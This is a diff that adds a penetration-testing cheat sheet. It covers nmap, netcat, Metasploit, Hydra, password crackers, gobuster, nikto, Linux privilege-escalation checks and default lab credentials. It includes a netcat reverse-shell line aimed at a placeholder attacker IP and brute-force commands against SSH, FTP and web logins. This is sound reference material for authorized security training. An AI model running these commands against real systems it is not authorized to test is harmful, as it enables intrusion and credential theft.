@@ -1,0 +1,131 @@
+====================================================
+  CYBERSECURITY QUICK REFERENCE CHEATSHEET
+  Authored by Amit Padhan
+====================================================
+
+----------------------------------------------------
+  NMAP – Network Scanner
+----------------------------------------------------
+nmap -sn <subnet>/24                   # Ping sweep (host discovery)
+nmap -sV -p- <target>                  # Full port scan with version detection
+nmap -A <target>                       # Aggressive scan (OS, version, scripts)
+nmap -sU -p 53,161 <target>            # UDP scan on specific ports
+nmap -p 23 -sV <target>                # Scan Telnet port with version
+nmap --script vuln <target>            # Run vulnerability scripts
+nmap -oN output.txt <target>           # Save output to file
+
+----------------------------------------------------
+  NETCAT – Network Swiss Army Knife
+----------------------------------------------------
+nc -lvnp <port>                        # Start listener
+nc <target> <port>                     # Connect to target
+# WARNING: Only use in authorized lab/CTF environments
+nc -e /bin/bash <attacker-ip> <port>   # Reverse shell
+
+----------------------------------------------------
+  METASPLOIT – Exploitation Framework
+----------------------------------------------------
+msfconsole                             # Launch Metasploit
+search <module>                        # Search for exploit/module
+use <module>                           # Select a module
+show options                           # Show required options
+set RHOSTS <target>                    # Set target host
+set LHOST <attacker-ip>                # Set local host (for reverse shells)
+set LPORT <port>                       # Set local port
+run / exploit                          # Execute the module
+sessions -l                            # List active sessions
+sessions -i <id>                       # Interact with session
+
+----------------------------------------------------
+  HYDRA – Password Brute Forcer
+----------------------------------------------------
+hydra -l <user> -P <wordlist> <target> ssh          # SSH brute force
+hydra -l <user> -P <wordlist> <target> ftp          # FTP brute force
+hydra -l <user> -P <wordlist> <target> telnet       # Telnet brute force
+hydra -L <users.txt> -P <wordlist> <target> http-post-form \
+  "/login:user=^USER^&pass=^PASS^:F=incorrect"      # HTTP form brute force
+
+----------------------------------------------------
+  JOHN THE RIPPER – Password Cracker
+----------------------------------------------------
+john <hashfile>                        # Crack with default wordlist
+john --wordlist=<wordlist> <hashfile>  # Crack with custom wordlist
+john --format=md5 <hashfile>           # Specify hash format
+john --show <hashfile>                 # Show cracked passwords
+
+----------------------------------------------------
+  HASHCAT – GPU Password Cracker
+----------------------------------------------------
+hashcat -m 0 <hashfile> <wordlist>     # MD5
+hashcat -m 100 <hashfile> <wordlist>   # SHA1
+hashcat -m 1800 <hashfile> <wordlist>  # SHA-512 (Linux shadow)
+hashcat -m 1000 <hashfile> <wordlist>  # NTLM (Windows)
+
+----------------------------------------------------
+  GOBUSTER – Directory/File Brute Forcer
+----------------------------------------------------
+gobuster dir -u http://<target> -w <wordlist>        # Dir enumeration
+gobuster dns -d <domain> -w <wordlist>               # DNS subdomain enum
+gobuster dir -u http://<target> -w <wordlist> -x php,html,txt  # With extensions
+
+----------------------------------------------------
+  NIKTO – Web Vulnerability Scanner
+----------------------------------------------------
+nikto -h http://<target>               # Basic web scan
+nikto -h http://<target> -p 8080       # Scan on alternate port
+nikto -h http://<target> -o report.txt # Save output
+
+----------------------------------------------------
+  TELNET
+----------------------------------------------------
+telnet <target>                        # Connect to target on port 23
+telnet <target> <port>                 # Connect to a custom port
+
+----------------------------------------------------
+  SSH
+----------------------------------------------------
+ssh <user>@<target>                    # Basic SSH login
+ssh -i id_rsa <user>@<target>          # Login with private key
+ssh -L <local-port>:<dest>:<dest-port> <user>@<target>  # Port forwarding
+
+----------------------------------------------------
+  LINUX PRIVILEGE ESCALATION – Quick Checks
+----------------------------------------------------
+sudo -l                                # Check sudo permissions
+find / -perm -4000 2>/dev/null         # Find SUID binaries
+cat /etc/passwd                        # List users
+cat /etc/crontab                       # Check cron jobs
+uname -a                               # Kernel version
+ps aux                                 # Running processes
+
+----------------------------------------------------
+  COMMON PORTS REFERENCE
+----------------------------------------------------
+21   - FTP
+22   - SSH
+23   - Telnet
+25   - SMTP
+53   - DNS
+80   - HTTP
+110  - POP3
+139  - SMB / NetBIOS
+143  - IMAP
+443  - HTTPS
+445  - SMB
+3306 - MySQL
+3389 - RDP (Remote Desktop)
+8080 - HTTP Alternate
+
+----------------------------------------------------
+  DEFAULT CREDENTIALS (for lab/CTF VMs)
+----------------------------------------------------
+# WARNING: These credentials are for educational/testing purposes only.
+# NEVER use these in production environments or on systems you don't own.
+Metasploitable 2 :  msfadmin / msfadmin
+DVWA             :  admin / password
+WordPress        :  admin / admin  (common default)
+phpMyAdmin       :  root / (blank)  (common default)
+
+====================================================
+  END OF CHEATSHEET
+====================================================
